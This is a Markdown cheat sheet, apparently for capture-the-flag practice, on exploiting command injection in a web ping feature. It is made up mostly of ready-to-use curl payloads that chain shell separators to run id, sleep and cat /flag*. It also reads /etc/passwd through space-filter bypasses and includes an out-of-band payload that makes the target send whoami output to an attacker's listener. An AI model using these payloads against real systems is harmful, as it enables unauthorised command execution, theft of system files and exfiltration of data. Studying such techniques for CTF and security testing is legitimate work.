# Command Injection

## Fastest First-Pass Checklist

```bash
# Purpose: cheapest possible probe — inject a harmless command chained with a shell metacharacter
curl -s "https://target.example/ping?host=127.0.0.1;id"

# Purpose: timing-based blind confirmation when output isn't reflected
time curl -s "https://target.example/ping?host=127.0.0.1;sleep 5"
```

## Technique: Direct (Output-Reflected) Command Injection

**When to use it**: any feature that plausibly shells out to a system
command with user input (ping/traceroute tools, image conversion, PDF
generation, "run this diagnostic" features).

**Fast path**:
```bash
# Purpose: try each common shell metacharacter/separator — different shells/contexts allow different ones
curl -s "https://target.example/ping?host=127.0.0.1;id"
curl -s "https://target.example/ping?host=127.0.0.1|id"
curl -s "https://target.example/ping?host=127.0.0.1\`id\`"
curl -s "https://target.example/ping?host=127.0.0.1\$(id)"
curl -s "https://target.example/ping?host=127.0.0.1%0aid"     # newline injection
```
**Indicators**: output of `id` (uid=... gid=...) appears in the response —
confirms shell metacharacter injection into a real command execution
context.

**Next Step**: escalate the injected command directly to read the flag:
```bash
# Purpose: once confirmed, go straight for likely flag locations instead of further probing
curl -s "https://target.example/ping?host=127.0.0.1;cat /flag*"
curl -s "https://target.example/ping?host=127.0.0.1;find / -iname 'flag*' 2>/dev/null"
```

## Technique: Blind Command Injection

**When to use it**: no command output is reflected in the response.

**Fast path (timing-based)**:
```bash
# Purpose: sleep injected — a measurable delay confirms execution even with zero output
time curl -s "https://target.example/ping?host=127.0.0.1;sleep 5"
```
**Indicators**: response takes ~5s longer than baseline → command executed.

**Fast path (out-of-band)**:
```bash
# Purpose: trigger a DNS/HTTP callback to your own listener — works even with no timing signal available
curl -s "https://target.example/ping?host=127.0.0.1;curl http://YOUR_LISTENER/oob-\$(whoami)"
```
Check your listener's access log for the callback and any exfiltrated data
embedded in the request path.

## Technique: Filter Bypass

**Indicators**: spaces/specific characters blocked by a naive filter.

**Fast path** (bypass candidates):
```bash
# Purpose: alternatives to a blocked space character
curl -s "https://target.example/ping?host=127.0.0.1;cat</etc/passwd"     # redirection instead of arg
curl -s "https://target.example/ping?host=127.0.0.1;cat\${IFS}/etc/passwd"  # $IFS as space substitute
curl -s "https://target.example/ping?host=127.0.0.1;{cat,/etc/passwd}"   # brace expansion avoids space entirely
```

## Common Mistakes

- Only trying `;` as a separator — different underlying shells/contexts
  respond to `|`, backticks, `$()`, or newlines differently; try several.
- Not checking for blind injection via timing/OOB when output isn't
  reflected — concluding "not vulnerable" too early.
- Forgetting URL-encoding for metacharacters that have meaning in a query
  string (`&`, `;` in some contexts) — verify the payload actually arrives
  at the server intact by checking access logs or response behavior.
